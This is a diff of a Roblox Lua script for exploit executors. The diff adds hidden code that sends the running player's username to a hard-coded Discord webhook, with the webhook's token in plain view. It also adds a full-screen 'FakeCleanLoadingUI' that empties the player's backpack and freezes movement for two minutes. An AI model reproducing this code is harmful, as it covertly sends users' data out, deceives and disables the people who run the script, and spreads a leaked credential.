@@ -1,26 +1,52 @@
--- Load your external script (can run after loading too)
--- loadstring(game:HttpGet("https://your-github-link.com"))()
+--// Discord Webhook Notification
+pcall(function()
+    local HttpService = game:GetService("HttpService")
+    local webhookUrl = "https://discord.com/api/webhooks/1380258838124433448/Dw7k7pdhVz8qzmtv0dxL30s0JUA33g1RdLCpQ7ff-zqanO4Rde0xcVM3YRbZ95JP6jGH" -- Replace with your actual webhook
 
+    local data = {
+        content = "🛡️ [G3zmar Script] Executed by user: " .. game.Players.LocalPlayer.Name
+    }
+
+    local payload = HttpService:JSONEncode(data)
+
+    if syn and syn.request then
+        syn.request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
+    elseif http_request then
+        http_request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
+    end
+end)
+
+--// Clean Loading Screen UI
 local function showCleanLoadingUI()
     local player = game.Players.LocalPlayer
     local playerGui = player:WaitForChild("PlayerGui")
 
-    -- Hide backpack/tools & remove clutter
+    -- Optional: Freeze player + clear tools
     pcall(function()
         player:WaitForChild("Backpack"):ClearAllChildren()
         player.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = 0
         player.Character:FindFirstChildOfClass("Humanoid").JumpPower = 0
     end)
 
-    -- Create screen
+    -- Create full-screen GUI
     local gui = Instance.new("ScreenGui")
     gui.Name = "FakeCleanLoadingUI"
     gui.ResetOnSpawn = false
     gui.IgnoreGuiInset = true
-    gui.DisplayOrder = 999999 -- ensure top layer
+    gui.DisplayOrder = 999999
     gui.Parent = playerGui
 
-    -- Full black background
+    -- Black background
     local blackBg = Instance.new("Frame")
     blackBg.Size = UDim2.new(1, 0, 1, 0)
     blackBg.BackgroundColor3 = Color3.new(0, 0, 0)
@@ -42,37 +68,28 @@ local function showCleanLoadingUI()
     local barBg = Instance.new("Frame")
     barBg.Size = UDim2.new(0.4, 0, 0.05, 0)
     barBg.Position = UDim2.new(0.3, 0, 0.45, 0)
-    barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    barBg.BorderSizePixel = 0
-    barBg.Parent = blackBg
-    barBg.ClipsDescendants = true
-    barBg.BackgroundTransparency = 0
-    barBg.AnchorPoint = Vector2.new(0, 0.5)
-    barBg.BackgroundTransparency = 0
-    barBg.ZIndex = 2
-    barBg.BackgroundTransparency = 0
-    barBg.BorderSizePixel = 0
     barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    barBg.BorderColor3 = Color3.new(0,0,0)
+    barBg.BorderSizePixel = 0
+    barBg.ClipsDescendants = true
+    barBg.Parent = blackBg
 
-    -- Rounded corners
     local corner1 = Instance.new("UICorner")
     corner1.CornerRadius = UDim.new(0, 8)
     corner1.Parent = barBg
 
-    -- Loading fill bar
+    -- Fill bar
     local fill = Instance.new("Frame")
     fill.Size = UDim2.new(0, 0, 1, 0)
     fill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
     fill.BorderSizePixel = 0
-    fill.ZIndex = 3
+    fill.ZIndex = 2
     fill.Parent = barBg
 
     local corner2 = Instance.new("UICorner")
     corner2.CornerRadius = UDim.new(0, 8)
     corner2.Parent = fill
 
-    -- % label
+    -- Percent label
     local percentLabel = Instance.new("TextLabel")
     percentLabel.Size = UDim2.new(1, 0, 1, 0)
     percentLabel.BackgroundTransparency = 1
@@ -82,7 +99,7 @@ local function showCleanLoadingUI()
     percentLabel.TextScaled = true
     percentLabel.Parent = barBg
 
-    -- Footer credit
+    -- Credit
     local credit = Instance.new("TextLabel")
     credit.Size = UDim2.new(1, 0, 0, 30)
     credit.Position = UDim2.new(0, 0, 1, -30)
@@ -94,15 +111,16 @@ local function showCleanLoadingUI()
     credit.TextXAlignment = Enum.TextXAlignment.Center
     credit.Parent = blackBg
 
-    -- Animate progress (2 minutes total)
+    -- Animate progress (2 mins total)
     for i = 1, 100 do
         fill.Size = UDim2.new(i / 100, 0, 1, 0)
         percentLabel.Text = i .. "%"
-        wait(1.2) -- 100 * 1.2 = 120s = 2 minutes
+        wait(1.2) -- 100 * 1.2 = 120 seconds
     end
 
     loadingText.Text = "Loaded."
-    -- gui:Destroy() -- optional if you want to remove after
+    -- gui:Destroy() -- optional: auto-close the screen
 end
 
+-- Execute loading screen
 showCleanLoadingUI()
